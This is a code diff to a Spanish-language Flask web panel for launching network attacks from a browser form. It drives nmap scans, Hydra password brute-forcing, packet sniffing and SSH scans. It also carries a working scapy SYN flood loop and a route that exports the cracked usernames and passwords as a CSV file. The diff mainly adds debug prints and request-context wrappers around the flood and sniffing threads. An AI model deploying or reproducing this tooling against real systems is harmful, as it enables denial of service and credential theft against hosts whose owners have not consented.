@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, copy_current_request_context
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 import subprocess, os, sqlite3, threading, random, time, smtplib
 from scapy.all import sniff, IP, TCP, UDP, send
@@ -175,12 +175,14 @@ def guardar_resultado_hydra(result, ip):
 # ---- SYN FLOOD ----
 def syn_flood_attack(ip, puerto, duracion):
     from scapy.layers.inet import IP, TCP
+    print(f"[DEBUG] Iniciando SYN Flood hacia {ip}:{puerto} durante {duracion}s")
     end = time.time() + int(duracion)
     while time.time() < end:
         pkt = IP(dst=ip)/TCP(sport=random.randint(1024,65535), dport=int(puerto), flags='S')
         send(pkt, verbose=False)
 
 def start_syn_flood(ip, puerto, duracion):
+    print(f"[DEBUG] Lanzando hilo SYN Flood contra {ip}:{puerto}")
     thread = threading.Thread(target=syn_flood_attack, args=(ip, puerto, duracion))
     thread.daemon = True
     thread.start()
@@ -230,7 +232,6 @@ def guardar_resultado_sniffing():
     except sqlite3.Error as e:
         print(f"[SQLITE SNIFFING] {e}")
 
-
 # ---- SSH Escaneo Interfaz ----
 def escanear_interfaz_ssh(ip, ssh_user, ssh_pass):
     try:
@@ -256,7 +257,6 @@ def guardar_ataque(ip, tipo_ataque, puerto=None):
         conn.close()
     except sqlite3.Error as e:
         print(f"[SQLITE ATAQUE] {e}")
-
 
 # ---- FLASK ROUTES ----
 @app.route('/login', methods=['GET', 'POST'])
@@ -284,14 +284,11 @@ def index():
     hydra_result = None
     ssh_result = None
     message = None
-
     if request.method == "POST":
         ip = request.form["ip"]
         tipo = request.form["tipo_ataque"]
-
         if tipo == "nmap":
             result = run_nmap(ip)
-
         elif tipo == "hydra":
             if current_user.role != "admin":
                 send_alert_denegado("Hydra")
@@ -301,7 +298,6 @@ def index():
                 usuario = request.form["usuario"]
                 proto = request.form["protocolo"]
                 hydra_result = run_hydra(ip, dicc, usuario, proto)
-
         elif tipo == "syn_flood":
             if current_user.role != "admin":
                 send_alert_denegado("SYN Flood")
@@ -309,9 +305,13 @@ def index():
             else:
                 puerto = request.form["puerto"]
                 duracion = request.form["duracion"]
-                threading.Thread(target=start_syn_flood, args=(ip, puerto, duracion)).start()
-                message = f"✅ Ataque SYN Flood iniciado contra {ip} en puerto {puerto} por {duracion} segundos."
 
+                @copy_current_request_context
+                def lanzar_syn_flood():
+                    start_syn_flood(ip, puerto, duracion)
+
+                threading.Thread(target=lanzar_syn_flood).start()
+                message = f"✅ Ataque SYN Flood iniciado contra {ip} en puerto {puerto} por {duracion} segundos."
         elif tipo == "sniff":
             if current_user.role != "admin":
                 send_alert_denegado("Sniffing")
@@ -319,14 +319,17 @@ def index():
             else:
                 interfaz = request.form["interfaz"]
                 duracion = request.form["duracion"]
-                threading.Thread(target=start_sniffing, args=(interfaz, duracion)).start()
-                message = f"✅ Sniffing iniciado en interfaz {interfaz} durante {duracion} segundos."
 
+                @copy_current_request_context
+                def lanzar_sniffing():
+                    start_sniffing(interfaz, duracion)
+
+                threading.Thread(target=lanzar_sniffing).start()
+                message = f"✅ Sniffing iniciado en interfaz {interfaz} durante {duracion} segundos."
         elif tipo == "ssh_ip":
             ssh_user = request.form["ssh_user"]
             ssh_pass = request.form["ssh_pass"]
             ssh_result = escanear_interfaz_ssh(ip, ssh_user, ssh_pass)
-
     diccionarios = obtener_diccionarios()
     return render_template("index.html",
                            result=result,
@@ -335,38 +338,31 @@ def index():
                            diccionarios=diccionarios,
                            message=message,
                            role=current_user.role,
-			   username=current_user.username)
+                           username=current_user.username)
 
 # NUEVA RUTA PARA DASHBOARDS
 @app.route('/dashboards')
 @login_required
 def dashboards():
-        return render_template('grafana.html', username=current_user.username)
+    return render_template('grafana.html', username=current_user.username)
 
 # Botón descargar passwords
-from flask import send_file, abort
-import io
-import csv
-
 @app.route('/download_passwords')
 @login_required
 def download_passwords():
     if current_user.role != 'admin':
         abort(403)
-
     try:
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT ip, puerto, usuario, password, protocolo FROM hydra_resultados")
         rows = c.fetchall()
         conn.close()
-
         output = io.StringIO()
         writer = csv.writer(output)
         writer.writerow(['IP', 'Puerto', 'Usuario', 'Contraseña', 'Protocolo'])
         writer.writerows(rows)
         output.seek(0)
-
         return send_file(
             io.BytesIO(output.getvalue().encode('utf-8')),
             mimetype='text/csv',
@@ -377,12 +373,9 @@ def download_passwords():
         return f"Error al generar archivo: {e}", 500
 
 # Página error 403
-from flask import abort
-
 @app.errorhandler(403)
 def forbidden(e):
     return render_template('403.html'), 403
-
 
 if __name__ == "__main__":
     app.run(debug=True)
